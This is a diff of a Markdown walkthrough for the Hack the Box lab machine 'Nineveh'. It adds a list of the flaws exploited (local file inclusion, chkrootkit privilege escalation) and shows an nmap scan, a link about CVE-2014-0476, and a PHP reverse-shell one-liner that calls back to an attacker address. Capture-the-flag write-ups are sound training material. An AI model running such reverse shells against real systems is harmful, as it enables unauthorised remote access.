@@ -1,6 +1,10 @@
 # Hack the Box - Nineveh
 
-
+```
+Vulnerabilities:
+  - Local File Inclusion
+  - chkrootkit
+```
 ## NMAP
 ```CSS
 ▶ nmap -Pn -sS -p- 10.10.10.43 -T4 --min-rate 1000 -oN surface.nmap
@@ -159,4 +163,5 @@ php -r '$sock=fsockopen("10.10.14.25",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ![image](https://user-images.githubusercontent.com/83878909/234613642-752c8e5c-3627-4b75-ac35-c4df4ae970c9.png)
 
-  - [chkrootkit Local Privilege Escalation](https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/)
+  - [Local Privilege Escalation - chkrootkit](https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/)
+
